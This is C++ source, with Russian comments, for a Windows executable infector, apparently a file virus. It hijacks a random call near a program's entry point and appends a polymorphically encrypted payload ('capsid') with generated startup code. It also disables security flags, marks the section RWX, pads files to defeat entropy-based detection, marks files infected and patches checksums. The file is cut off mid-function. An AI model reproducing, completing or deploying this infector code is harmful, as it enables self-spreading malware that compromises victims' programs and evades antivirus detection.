#include "infector.hpp"
#include "utils.hpp"
#include "math.h"

x86exe_infector::x86exe_infector()
{
#ifdef _DEBUG
	WriteLog(L"[x86exe_infector] constructor");
#endif
	this->infector = (IInfector*)new exe_infector;
}

x86exe_infector::~x86exe_infector()
{
#ifdef _DEBUG
	WriteLog(L"[x86exe_infector] destructor");
#endif
	if (this->infector != nullptr)
		delete this->infector;
}

BOOL x86exe_infector::process_file(HANDLE hFile, capsid_metadata *capsid, DWORD dwArch, IDNAProcessor *dna)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[x86exe_infector] processing x86 file with capsid size %d", capsid->size);
	WriteLog(debugOut);
#endif

	if (this->infector == nullptr)
		return FALSE;

	return this->infector->process_file(hFile, capsid, IMAGE_FILE_MACHINE_I386, dna);
}

x64exe_infector::x64exe_infector()
{
#ifdef _DEBUG
	WriteLog(L"[x64exe_infector] constructor");
#endif
	this->infector = (IInfector*)new exe_infector;
}

x64exe_infector::~x64exe_infector()
{
#ifdef _DEBUG
	WriteLog(L"[x64exe_infector] destructor");
#endif
	if (this->infector != nullptr)
		delete this->infector;
}

BOOL x64exe_infector::process_file(HANDLE hFile, capsid_metadata * capsid, DWORD dwArch, IDNAProcessor *dna)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[x64exe_infector] processing x64 file with capsid size %d", capsid->size);
	WriteLog(debugOut);
#endif

	if (this->infector == nullptr)
		return FALSE;

	return this->infector->process_file(hFile, capsid, IMAGE_FILE_MACHINE_AMD64, dna);
}

exe_infector::exe_infector()
{
#ifdef _DEBUG
	WriteLog(L"[exe_infector] constructor");
#endif
	
	this->codegenerator = (ICodegenEngine*)new BasicPolymorphicEngine;
	this->restorator = (IHostRestorator*)new CallRestoratorX25519;
	RtlSecureZeroMemory(&this->crbRestoratorBlock, sizeof(this->crbRestoratorBlock));
	this->dna_processor = nullptr;
}

exe_infector::~exe_infector()
{
#ifdef _DEBUG
	WriteLog(L"[exe_infector] destructor");
#endif

	if (this->codegenerator != nullptr)
		delete this->codegenerator;
	if (this->restorator != nullptr)
		delete this->restorator;
	RtlSecureZeroMemory(&this->crbRestoratorBlock, sizeof(this->crbRestoratorBlock));
}

BOOL exe_infector::process_file(HANDLE hFile, capsid_metadata * capsid, DWORD dwArch, IDNAProcessor *dna)
{
	if ((this->codegenerator == nullptr) || (this->restorator == nullptr))
		return FALSE;

	this->dna_processor = dna;

	BOOL bRet = FALSE;
	// возвращаемое значение аппендера к последней секции, содержит rva и файловые офсеты до приаттаченных данных
	appender::appender_status capsid_status, startupcode_status, last_rva;
	CallRestoratorRVA RestoreRVA;
	DWORD32 dwEndStartupcodePlaceholderRVA = 0;
	RtlSecureZeroMemory(&RestoreRVA, sizeof(RestoreRVA));
	RtlSecureZeroMemory(&capsid_status, sizeof(capsid_status));
	RtlSecureZeroMemory(&startupcode_status, sizeof(capsid_status));

#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif

	LPBYTE lpStartupcode = nullptr;
	SIZE_T dwStartupcodeSize = 0;

	unsigned char dummy[2];
	do
	{
		if (this->is_overlay(hFile, dwArch))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::process_file] file has overlay, skipping...");
#endif
			break;
		}
		// найдем офсеты до инструкции которую перехватим на наш стартап код, запомнив оригинальный адрес перехода
		// ВНИМАНИЕ, ATTENTION: данный вызов должен быть ДО любых изменений в файле на диске, если используется флаг _FNO_FLAGS_USEHEURISTICS
		// поскольку только на этом этапе можно определить эвристикой факт зараженности файла
		if (!this->find_call_victim(hFile, dwArch))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::process_file] error cant find call rel32 for interception");
#endif
			break;
		}

		/* ----------- APPEND CAPSID --------------- */
		this->fix_entropy(hFile, entropyfix_types_t::ENTROPYFIX_BEFORE_CAPSID, dwArch, capsid->size);

		// пошифруем и приаппендим капсид к последней секции вместе с зарезервированым местом под блок восстановления
		if (!this->append_capsid(hFile, capsid, &capsid_status, dwArch))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::process_file] error cant append encrypted capsid");
#endif
			break;
		}

		/* --------------- GEN STARTUP -------------------- */
		this->fix_entropy(hFile, entropyfix_types_t::ENTROPYFIX_BEFORE_STARTUP, dwArch, capsid->size);

		// далее мы сгенерируем стартап код, который расшифрует капсид и передаст управление на загрузчик нужной разрядности
		// адреса загрузчика есть в метаданных капсида, в стартап коде нет смысла читать, при генерации захардкодим
		// после возврата из загрузчика стартап код должен перейти по адресу на который вел оригинальный call rel32
		// после записи стартап кода в конец секции - перехватим call rel32 заставив его переходить на стартап

		// получим RVA данных как если бы их дописали, но без самой записи, нужно для генератора кода, чтобы он мог верно посчитать смещения
		if (!this->appender.append_data(hFile, dummy, sizeof(dummy), &last_rva, dwArch, TRUE))
		{
#ifdef _DEBUG
			WriteLog(L"exe_infector::process_file] cant calculate startup RVA");
#endif
			break;
		}

		// сгенерируем стартап код расшифровывающий капсид и передающий управление на загрузчик нужной разрядности
		// а также восстанавливающий управление хостового апп через прыжок на оригинальный таргет
		if (!this->generate_startup_code(capsid, capsid_status.BeginDataRVA, this->target_call.RVA_Target, last_rva.BeginDataRVA, dwArch, &lpStartupcode, &dwStartupcodeSize, &dwEndStartupcodePlaceholderRVA))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::process_file] cant generate startup code");
#endif
			break;
		}


		if (!this->append_startup(hFile, lpStartupcode, dwStartupcodeSize, &startupcode_status, dwArch))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::process_file] cant append data [2] ");
#endif
			break;
		}

		/* ----------- POST STARTUP PROCESSING -------------- */
		this->fix_entropy(hFile, entropyfix_types_t::ENTROPYFIX_BEFORE_OVERLAY, dwArch, capsid->size);

		// отключает различные флаги которые могут мешать инфектору
		if (!this->appender.disable_security(hFile, dwArch, TRUE))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::process_file] warning: cant disable security, app possibly can crash");
#endif
			// break; // не нужен потому что не критичный проеб
		}

		// установим последней секции RWX аттрибуты
		if (!this->appender.set_attributes(hFile, IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE, dwArch))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::process_file] error cant add rwx attributes");
#endif
			break;
		}
		
#ifdef _DEBUG
		wsprintfW(debugOut, L"[exe_infector::process_file] appended capsid RVA = 0x%x, file offset = 0x%x | appended startup RVA = 0x%x, file offset = 0x%x",
			capsid_status.BeginDataRVA, capsid_status.BeginDataFileOffset, startupcode_status.BeginDataRVA, startupcode_status.BeginDataFileOffset);
		WriteLog(debugOut);
#endif

		if (!this->dump_restoredata(hFile, &capsid_status, &startupcode_status, capsid->size, dwEndStartupcodePlaceholderRVA))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector_process_file] cant save restore data");
#endif
			break;
		}
		
		// после всех манипуляций произведем окончательную операцию по перехвату управления и установим флаги зараженности + поправим чексумму
		bRet = this->install_hook(hFile, startupcode_status.BeginDataRVA);
		if (bRet)
		{
			this->set_infected(hFile, dwArch);
			this->fix_checksum(hFile, dwArch);
		}

	} while (FALSE);

	return bRet;
}

// найдет и выберет случайным образом 1 вызов из первых вызовов по пути исполнения кода с точки входа апп
BOOL exe_infector::find_call_victim(HANDLE hFile, DWORD dwArch)
{
#ifdef _DEBUG
	WriteLog(L"[exe_infector::find_call_victim] searching for a call to intercept");
#endif

	flow_disasm::call_list *call_list = nullptr;
	LARGE_INTEGER liMoveDistance;
	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));

	DWORD dwRead;
	DWORD dwHeadersSize = 0;
	LPBYTE lpHeaders = nullptr;
	DWORD dwAddressOfEntryPoint = 0;
	DWORD dwSizeOfCode = 0;
	DWORD dwBaseOfCode = 0;
	UINT_PTR pNtHeaders = NULL;
	BOOL bRet = FALSE;
	UINT uCallFound = 0; // общее кол-во найденных вызывов
	UINT uCallChosen = 0;  // выбранный индекс найденного вызова

	flow_disasm::call_list *pChosenCall = nullptr;

	code_sect code;
	do
	{
		dwHeadersSize = GetPEHeadersSize(hFile, dwArch);
		if (dwHeadersSize == 0)
			break;

		lpHeaders = new BYTE[dwHeadersSize + 1];
		if (lpHeaders == nullptr)
			break;
		
		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		if (!ReadFile(hFile, lpHeaders, dwHeadersSize, &dwRead, 0))
			break;

		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpHeaders;
		pNtHeaders = (UINT_PTR)((SIZE_T)pDos + (SIZE_T)pDos->e_lfanew);

		switch (dwArch)
		{
		case IMAGE_FILE_MACHINE_I386:
			dwAddressOfEntryPoint = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.AddressOfEntryPoint;
			break;
		case IMAGE_FILE_MACHINE_AMD64:
			dwAddressOfEntryPoint = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.AddressOfEntryPoint;
			break;
		}

		if (dwAddressOfEntryPoint == 0)
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::find_call_victim] error entrypoint address = 0");
#endif
			break;
		}

		// прочитаем полностью кодовую секцию для того чтобы потом включить потоковый дизассемблер
		if (!this->read_code_section(hFile, pNtHeaders, dwArch, dwAddressOfEntryPoint, &code))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::find_call_victim] cant read code section");
#endif
			break;
		}

		// активация потокового дизассемблера
		DWORD dwDisRet = this->disassembler.begin(
			code.lpBuffer,
			(LPBYTE)((SIZE_T)code.lpBuffer + (SIZE_T)code.EntryDelta),
			code.dwBufferSize,
			&call_list,
			dwArch,
			DISASSEMBLER_MAXIMUM_DEPTH, 
			NULL
			);

#ifdef _FNO_FLAGS_USEHEURISTICS // если используем эвристику как определение зараженности файла, то проверим не совершался ли выход за пределы кодовой секции
		if (dwDisRet == DISASM_CALLOUT_SECTION)
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::find_call_victim] call out of section, file has been already INFECTED");
#endif
			break; // в данном случае считаем, что файл был уже заражен
		}
#endif
		
		// количество найденных call rel32
		uCallFound = this->disassembler.call_amount(&call_list);
		if (uCallFound == 0)
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::find_call_victim] error: did not find any calls");
#endif
			break;
		}

#ifdef _DEBUG
		this->disassembler.print_call_list(call_list);
		WriteLog(L"^ printed all found calls");
#endif

		// выберем 1 случайный вызов
#ifdef _SLOW_POLYMORPHISM
		long holdrand = this->dna_processor->get_value(dna_fields_t::HOOK_SEED, TRUE, NULL, NULL);
#else
		long holdrand = GetTickCount();
#endif
		if (uCallFound <= MAXIMUM_CALL_POOL)
			uCallChosen = _rand(&holdrand) % uCallFound;
		else
			uCallChosen = _rand(&holdrand) % MAXIMUM_CALL_POOL;

		pChosenCall = this->disassembler.get_i_entry(call_list, uCallChosen);
		if ((pChosenCall == nullptr) || (pChosenCall->call_offset == 0))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::find_call_victim] error: chosen invalid call");
#endif
			break;
		}

		// call_offset - дельта инструкции на диске от начала кодовой секции
		// чтобы получить файловый оффсет нужно прибавить эту дельту к файловому офсету кодовой секции
		// чтобы получить RVA, то прибавим RVA начала кодовой секции
		// в target_call будет результат работы подсистемы поиска жертвы call rel32
		this->target_call.offset.RVA = code.RVA + pChosenCall->call_offset;
		this->target_call.offset.FileOffset = code.FileOffset + pChosenCall->call_offset;
		// опкод занимает 1 байт, операнд идет тут же за ним и это little-endian дворд кодирующий signed int
		this->target_call.rel32_decoded = this->disassembler.decode_rel32(&code.lpBuffer[pChosenCall->call_offset + 1]);
		// посчитаем RVA адреса куда совершается переход. Он расчитывается как rel32 офсет от RVA следующей за call инструкции
		// E8 xx xx xx xx == 5 байт, следовательно call_offset + 5 +- rel32
		if (this->target_call.rel32_decoded > 0)
			this->target_call.RVA_Target = ((DWORD32)(this->target_call.offset.RVA + 5) + (DWORD32)abs(this->target_call.rel32_decoded));
		else
			this->target_call.RVA_Target = ((DWORD32)(this->target_call.offset.RVA + 5) - (DWORD32)abs(this->target_call.rel32_decoded));

#ifdef _DEBUG
		WCHAR debugOut[1024];
		wsprintfW(debugOut, L"[exe_infector::find_call_victim] calls found: %d, chose %d-th call rva = 0x%x, file offset = 0x%x, rel32 = %i, call to addr with rva = 0x%x",
			uCallFound, uCallChosen, this->target_call.offset.RVA, this->target_call.offset.FileOffset, this->target_call.rel32_decoded, this->target_call.RVA_Target);
		WriteLog(debugOut);
#endif

		bRet = TRUE;

	} while (FALSE);

	SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN);

	if (call_list != nullptr)
		this->disassembler.destroy_list(&call_list);

	if (lpHeaders != nullptr)
		delete[]lpHeaders;

	if (code.lpBuffer != nullptr)
		delete[]code.lpBuffer;


	return bRet;
}

// производит перехват target_call на новый RVA
// dwTargetRVA - RVA инструкции на которую совершается переход
// перехват производится через перезапись операнда rel32 у E8 xx xx xx xx лежащему по файловому офсету в target_call
// rel32 высчитывается как разница между dwTargetRVA с RVA следующей инструкции за target_call (+5 от RVA target_call) 
// кодируется как little endian DWORD и записывается по файловому офсету операнда target_call

BOOL exe_infector::install_hook(HANDLE hFile, DWORD32 dwTargetRVA)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif
	BOOL bRet = FALSE;
	LARGE_INTEGER liMoveDistance;
	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));
	DWORD32 rel32 = 0;

	DWORD dwWritten;
	do
	{
		// файловый офсет операнда
		liMoveDistance.QuadPart = (LONGLONG)(target_call.offset.FileOffset + 1);
		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		rel32 = dwTargetRVA - (target_call.offset.RVA + 5);

#ifdef _DEBUG
		wsprintfW(debugOut, L"[exe_infector::install_hook] writing new call at 0x%x with rel32 = %i, jumping to rva 0x%x",
			target_call.offset.FileOffset,
			(int)rel32,
			dwTargetRVA
			);
		WriteLog(debugOut);
#endif

		bRet = WriteFile(hFile, &rel32, sizeof(rel32), &dwWritten, NULL);

	} while (FALSE);

	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));
	SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN);

	return bRet;
}

BOOL exe_infector::append_capsid(HANDLE hFile, capsid_metadata * capsid, appender::appender_status * out_status, DWORD dwArch)
{
	IEncgen *encryption = this->codegenerator->get_encryption();
	if (encryption == nullptr)
		return FALSE;

	// размер блока в генерируемом алгоритме. Должна быть степени двойки, капсид должен быть выравнен по этому блоку
	// при генерации капсида он выравнивается к 2^MAX_POWER_OF_TWO_ENCGEN, следовательно мы можем генерировать любой размер блока
	// не более 2^MAX_POWER_OF_TWO_ENCGEN
	DWORD dwBlockSize = pow(2, (_rand(this->codegenerator->get_holdrand_pointer()) % (MAX_POWER_OF_TWO_ENCGEN - MIN_POWER_OF_TWO)) + MIN_POWER_OF_TWO);
	
	// выделим память также под блок восстановления который будет идти сразу за капсидом. Пишем именно вместе с капсидом, чтобы не было между ними выравнивания
	LPBYTE lpEncryptedCapsid = new BYTE[capsid->size + sizeof(this->crbRestoratorBlock) + 1];
	BOOL bRet = FALSE;
	do
	{
		if (lpEncryptedCapsid == nullptr)
			break;

		_RtlCopyMemory(lpEncryptedCapsid, (LPBYTE)capsid, capsid->size);

		if (!encryption->init(dwBlockSize, this->dna_processor->get_value(dna_fields_t::POLYENC_SEED, TRUE, NULL, NULL)))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::append_capsid] error cant initialize polymorphic encryption algorithm generator engine");
#endif
			break;
		}

		// шифруем только капсид, а блок восстановления будет на данный момент просто нули - зарезервированным
		if (!encryption->encrypt_buffer(lpEncryptedCapsid, capsid->size))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::append_capsid] error cant interpet polymorphic IL to encrypt capsid buffer");
#endif
			break;
		}

		// запишем капсид + блок восстановления
		bRet = this->appender.append_data(hFile, lpEncryptedCapsid, capsid->size + sizeof(this->crbRestoratorBlock), out_status, dwArch, FALSE);

	} while (FALSE);

	if (lpEncryptedCapsid != nullptr)
		delete[]lpEncryptedCapsid;

	return bRet;
}

BOOL exe_infector::append_startup(HANDLE hFile, LPBYTE lpStartupCode, SIZE_T dwStartupSize, appender::appender_status * out_status, DWORD dwArch)
{
	// TODO: хорошо бы это перенести в codegen там где создается restoration block... забыл что там есть такое место поэтому начал делать тут, а потом увидел как затупил
	BOOL bRet = FALSE;

	// хотя TRASHCODE_PARAM был предназначен для другого, для того чтобы не перегружать ДНК-код используем его как размер
	//DWORD dwTrashSize = this->dna_processor->get_value(dna_fields_t::TRASHCODE_PARAM, FALSE, 16, 1024);

	LPBYTE lpTotalBuffer = new BYTE[dwStartupSize + 1];
	//LPBYTE lpTrashCode = &lpTotalBuffer[dwStartupSize]; // трешкод идет сразу после стартапа

	DWORD dwTotalSize = dwStartupSize; // инициализируем размером стартап кода, потом добавим размер завершающего
	do
	{
		if (lpTotalBuffer == nullptr)
			break;

		_RtlCopyMemory(lpTotalBuffer, lpStartupCode, dwStartupSize);
		//dwTotalSize += this->generate_endcode(lpTrashCode, dwTrashSize, dwArch);
		
		// приаппендим стартап код на который будем передавать управление + завершающий код
		if (!this->appender.append_data(hFile, lpTotalBuffer, dwTotalSize, out_status, dwArch, FALSE))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::process_file] cant append data [2]");
#endif
			break;
		}

		bRet = TRUE;

	} while (FALSE);

	if (lpTotalBuffer != nullptr)
		delete[]lpTotalBuffer;

	return bRet;
}

BOOL exe_infector::dump_restoredata(HANDLE hFile, appender::appender_status * capsid_status, appender::appender_status * startup_status, SIZE_T dwCapsidSize, DWORD32 dwPlaceholderEndStartupRVA)
{
	BOOL bRet = FALSE;

	LARGE_INTEGER liMoveDistance;
	CallRestoratorRVA RVA;
	RtlSecureZeroMemory(&RVA, sizeof(RVA));
	RtlSecureZeroMemory(&liMoveDistance, sizeof(&liMoveDistance));

	RVA.dwRVAStartupBegin = startup_status->BeginDataRVA;
	RVA.dwRVAstartupEnd = dwPlaceholderEndStartupRVA;
	RVA.dwRVAOriginalFunction = this->target_call.RVA_Target;

	SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN);


	DWORD dwWritten;
	do
	{
		if (this->restorator == nullptr)
			break;

		this->restorator->create_restorator_block((LPBYTE)&this->crbRestoratorBlock, sizeof(this->crbRestoratorBlock), (LPBYTE)&RVA, sizeof(RVA));

		// блок восстановления следует сразу за капсидом, размер данных в capsid_status содержит также блок восстановления поэтому берем размер из аргументов
		liMoveDistance.QuadPart = (LONGLONG)(capsid_status->BeginDataFileOffset + dwCapsidSize);
		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		bRet = WriteFile(hFile, (LPBYTE)&this->crbRestoratorBlock, sizeof(this->crbRestoratorBlock), &dwWritten, NULL);

	} while (FALSE);

	return bRet;
}

BOOL exe_infector::read_code_section(HANDLE hFile, UINT_PTR pNtHeaders, DWORD dwArch, DWORD AddressOfEntryPoint, code_sect * code_section)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif
	LARGE_INTEGER liMoveDistance;
	RtlSecureZeroMemory(&liMoveDistance, sizeof(&liMoveDistance));
	RtlSecureZeroMemory(code_section, sizeof(code_sect));

	SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN);

	BOOL bRet = FALSE;

	PIMAGE_SECTION_HEADER pFirstSection = nullptr;
	PIMAGE_SECTION_HEADER pSection = nullptr;
	DWORD dwSizeOfOptionalHeader = 0;
	DWORD dwNumberOfSections = 0;
	UINT i = 0;
	DWORD dwRead;
	do
	{
		// получим указатель на первую секцию
		switch (dwArch)
		{
		case IMAGE_FILE_MACHINE_I386:
			dwNumberOfSections = ((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.NumberOfSections;
			dwSizeOfOptionalHeader = ((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.SizeOfOptionalHeader;
			pFirstSection = (PIMAGE_SECTION_HEADER)((SIZE_T)pNtHeaders + (SIZE_T)offsetof(IMAGE_NT_HEADERS32, OptionalHeader) + (SIZE_T)dwSizeOfOptionalHeader);
			break;
		case IMAGE_FILE_MACHINE_AMD64:
			dwNumberOfSections = ((PIMAGE_NT_HEADERS64)pNtHeaders)->FileHeader.NumberOfSections;
			dwSizeOfOptionalHeader = ((PIMAGE_NT_HEADERS64)pNtHeaders)->FileHeader.SizeOfOptionalHeader;
			pFirstSection = (PIMAGE_SECTION_HEADER)((SIZE_T)pNtHeaders + (SIZE_T)offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + (SIZE_T)dwSizeOfOptionalHeader);
			break;
		}

		if (pFirstSection == nullptr)
			break;
		
		BOOL bFound = FALSE;
		pSection = pFirstSection;
		for (i = 0; i < dwNumberOfSections; i++, pSection++)
		{
			// считаем именно от [VirtualAddress; VirtualAddress + SizeOfRawData), потому что в случае если точка входа указывает куда-то в виртуальные пустоты за пределы физической секциии мы получим краш
			if ((AddressOfEntryPoint >= pSection->VirtualAddress) && (AddressOfEntryPoint < pSection->VirtualAddress + pSection->SizeOfRawData /*pSection->Misc.VirtualSize*/))
			{
				bFound = TRUE;
				break;
			}
		}

		if (!bFound)
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::read_code_section] AddressOfEntryPoint was not found in any sections");
#endif
			break;
		}

		if (pSection->SizeOfRawData == 0)
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::read_code_section] code section raw size is zero, skipping");
#endif
			break;
		}

		liMoveDistance.QuadPart = (LONGLONG)pSection->PointerToRawData;
		SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN);

		code_section->dwBufferSize = pSection->SizeOfRawData;
		code_section->lpBuffer = new BYTE[code_section->dwBufferSize + 1];
		if (code_section->lpBuffer == nullptr)
			break;

		if (!ReadFile(hFile, code_section->lpBuffer, code_section->dwBufferSize, &dwRead, NULL))
			break;

		code_section->EntryDelta = AddressOfEntryPoint - pSection->VirtualAddress;
		code_section->RVA = pSection->VirtualAddress;
		code_section->FileOffset = pSection->PointerToRawData;

#ifdef _DEBUG
		wsprintfW(debugOut, L"[exe_infector::read_code_section] EP RVA = 0x%x found in section %S raw addr = 0x%x raw size = 0x%x, EP code section offset = 0x%x",
			AddressOfEntryPoint, pSection->Name, pSection->PointerToRawData, pSection->SizeOfRawData, code_section->EntryDelta
			);
		WriteLog(debugOut);
#endif
		
		bRet = TRUE;

	} while (FALSE);

	if ((!bRet) && (code_section->lpBuffer != nullptr))
	{
		delete[]code_section->lpBuffer;
		code_section->lpBuffer = nullptr;
	}

	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));
	SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN);

	return bRet;
}

BOOL exe_infector::generate_startup_code(capsid_metadata *capsid, DWORD32 capsidEntryRVA, DWORD32 dwOriginalCallRVA, DWORD32 dwCodePlaceRVA, DWORD dwArch, LPBYTE *lpOutputBuffer, SIZE_T *dwOutputBufferSize, PDWORD32 pdwOepReturnRVA)
{
	if (this->codegenerator == nullptr)
		return FALSE;

	BOOL bRet = FALSE;
	do
	{
		if (!this->codegenerator->init(capsid, capsidEntryRVA, dwOriginalCallRVA, dwCodePlaceRVA, dwArch, this->dna_processor->get_value(dna_fields_t::CODEGEN_SEED, TRUE, NULL, NULL), this->dna_processor))
			break;
		
		bRet = this->codegenerator->gen(lpOutputBuffer, dwOutputBufferSize, pdwOepReturnRVA);
	} while (FALSE);

	return bRet;
}

VOID exe_infector::set_infected(HANDLE hFile, DWORD dwArch)
{
#ifndef _FNO_FLAGS_USEHEURISTICS // устанавливаем маркер зараженности только в случае наличия дефайна об этом, иначе заголовки не трогаем
	LARGE_INTEGER liMoveDistance;
	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));


	DWORD dwHeadersSize = GetPEHeadersSize(hFile, dwArch);
	LPBYTE lpHeaders = nullptr;
	do
	{
		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		if (dwHeadersSize == 0)
			break;

		lpHeaders = new BYTE[dwHeadersSize + 1];
		if (lpHeaders == nullptr)
			break;

		DWORD dwRead = 0;
		if (!ReadFile(hFile, lpHeaders, dwHeadersSize, &dwRead, NULL))
			break;

		SetHeaderInfected((PIMAGE_DOS_HEADER)lpHeaders, dwArch);

		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		DWORD dwWritten;
		WriteFile(hFile, lpHeaders, dwHeadersSize, &dwWritten, NULL);

	} while (FALSE);

	if (lpHeaders != nullptr)
		delete[]lpHeaders;

	SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN);
#endif

	return;
}

BOOL exe_infector::fix_entropy(HANDLE hFile, entropyfix_types_t current_stage, DWORD dwArch, DWORD dwCapsidSize)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif

	appender::appender_status status;

	if (!this->dna_processor->get_value(dna_fields_t::USE_ENTROPYFIX, FALSE, 0, 2))
	{
#ifdef _DEBUG
		WriteLog("[exe_infector::fix_entropy] USE_ENTROPYFIX is false, skipping...");
#endif
		return TRUE;
	}

	if (current_stage != (entropyfix_types_t)this->dna_processor->get_value(dna_fields_t::ENTROPYFIX_PARAMETER, FALSE, 0, entropyfix_types_t::ENTROPYFIX_TOTAL_TYPES))
	{
#ifdef _DEBUG
		WriteLog(L"[exe_infector::fix_entropy] current stage is not specified as type of entropy fix, skipping...");
#endif
		return TRUE;
	}

	BOOL bRet = FALSE;
	LPBYTE lpBuffer = nullptr;
	SIZE_T dwEntropySize = 0;
	DWORD dwFileSize = 0;
	do
	{
		dwFileSize = GetFileSize(hFile, NULL);
		if (dwFileSize == 0)
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::fix_entropy] cant get file size");
#endif
			break;
		}

		if (current_stage > entropyfix_types_t::ENTROPYFIX_BEFORE_CAPSID)
			dwFileSize -= dwCapsidSize;

		// нам надо выравнивать энтропию только если заражаемый файл меньше дописываемого капсида, поскольку в таком случае значение энтропии будет зашкаливать
		if (dwFileSize > dwCapsidSize)
		{
#ifdef _DEBUG
			wsprintfW(debugOut, L"[exe_infector::fix_entropy] original file size %d is > capsid size %d, no need in entropy fixing", dwFileSize, dwCapsidSize);
			WriteLog(debugOut);
#endif
			bRet = TRUE;
			break;
		}

		dwEntropySize = 1024 * this->dna_processor->get_value(dna_fields_t::ENTROPYFIX_PARAMETER, FALSE, 512, 1024);
		lpBuffer = new BYTE[dwEntropySize];
		if (lpBuffer == nullptr)
			break;

		RtlSecureZeroMemory(lpBuffer, dwEntropySize);
		
		if (!this->appender.append_data(hFile, lpBuffer, dwEntropySize, &status, dwArch, FALSE))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::fix_entropy] error cant append zero buffer...");
#endif
			break;
		}

#ifdef _DEBUG
		wsprintfW(debugOut, L"[exe_infector::fix_entropy] added zerofill buffer %d bytes at stage 0x%X, capsid size %d original file size %d", dwEntropySize, current_stage, dwCapsidSize, dwFileSize);
		WriteLog(debugOut);
#endif

		bRet = TRUE;
	} while (FALSE);

	if (lpBuffer != nullptr)
		delete[]lpBuffer;

	return bRet;
}

BOOL exe_infector::is_overlay(HANDLE hFile, DWORD dwArch)
{
	SIZE_T dwHeadersSize = 0;
	LPBYTE lpHeaders = nullptr;
	LARGE_INTEGER liMoveDistance;
	DWORD dwRead = 0;
	UINT_PTR pNtHeaders = NULL;
	SIZE_T dwFileSize = 0;

	PIMAGE_SECTION_HEADER pFirstSection = nullptr;
	DWORD dwSizeOfOptionalHeader = 0;
	DWORD dwNumberOfSections = 0;
	PIMAGE_DATA_DIRECTORY pSecurityDir = nullptr;
	DWORD NumberOfRvaAndSizes = 0;
	RtlSecureZeroMemory(&liMoveDistance, sizeof(liMoveDistance));

	BOOL bRet = FALSE;
	SIZE_T dwSecuritySize = 0;
	SIZE_T dwFileAligment = 0;
	do
	{
		dwFileSize = GetFileSize(hFile, nullptr);
		if (dwFileSize == 0)
			break;

		dwHeadersSize = GetPEHeadersSize(hFile, dwArch);
		if (dwHeadersSize == 0)
			break;

		lpHeaders = new BYTE[dwHeadersSize + 1];
		if (lpHeaders == nullptr)
			break;

		if (!SetFilePointerEx(hFile, liMoveDistance, NULL, FILE_BEGIN))
			break;

		if (!ReadFile(hFile, lpHeaders, dwHeadersSize, &dwRead, 0))
			break;

		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpHeaders;
		pNtHeaders = (UINT_PTR)((SIZE_T)pDos + (SIZE_T)pDos->e_lfanew);

		switch (dwArch)
		{
		case IMAGE_FILE_MACHINE_I386:
			dwNumberOfSections = ((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.NumberOfSections;
			dwSizeOfOptionalHeader = ((PIMAGE_NT_HEADERS32)pNtHeaders)->FileHeader.SizeOfOptionalHeader;
			pFirstSection = (PIMAGE_SECTION_HEADER)((SIZE_T)pNtHeaders + (SIZE_T)offsetof(IMAGE_NT_HEADERS32, OptionalHeader) + (SIZE_T)dwSizeOfOptionalHeader);
			dwFileAligment = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.FileAlignment;
			NumberOfRvaAndSizes = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.NumberOfRvaAndSizes;

			if (IMAGE_DIRECTORY_ENTRY_SECURITY < NumberOfRvaAndSizes)
